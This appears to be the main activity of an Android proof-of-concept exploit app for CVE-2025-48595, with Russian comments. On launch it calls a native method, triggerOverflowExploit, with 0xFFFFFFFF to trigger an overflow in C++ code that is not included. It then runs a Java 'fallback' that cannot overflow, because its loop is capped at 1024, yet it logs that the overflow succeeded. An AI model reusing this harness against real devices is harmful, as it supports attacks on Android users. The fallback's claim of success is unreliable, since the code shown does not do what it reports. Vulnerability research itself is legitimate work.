package com.example.android_poc;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

public class MainActivity extends Activity {
    private static final String TAG = "CVE-2025-48595";

    // Загружаем библиотеку android_poc (совпадает с project name в CMake)
    static {
        System.loadLibrary("android_poc");
    }

    // Единственный нативный метод, который нам нужен сейчас
    public native String triggerOverflowExploit(int sizeHint);

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Log.i(TAG, "=== APP STARTED ===");

        // Вызываем C++ код с переполнением (передаём 0xFFFFFFFF как подсказку размера)
        String result = triggerOverflowExploit(0xFFFFFFFF);

        Log.i(TAG, "Результат из C++: " + result);
        Toast.makeText(this, "Exploit Result: " + result, Toast.LENGTH_LONG).show();

        // Альтернативный Java-уровень POC (если нативный код не сработал)
        try {
            triggerJavaOverflow();  // <-- Fallback через Java API
        } catch (Exception e) {
            Log.e(TAG, "Java overflow failed: " + e.getMessage());
        }
    }

    private void triggerJavaOverflow() {
        int maliciousValue = Integer.MAX_VALUE;  // Целевое значение для переполнения

        android.content.Intent intent = new android.content.Intent();
        intent.putExtra("malicious_data", maliciousValue);

        int result = processMaliciousData(maliciousValue);
        Log.i(TAG, "Java overflow triggered successfully, result=" + result);
    }

    private int processMaliciousData(int value) {
        int[] buffer = new int[1024];

        for (int i = 0; i < value && i < 1024; i++) {
            buffer[i] = i;
        }

        return buffer[0];
    }
}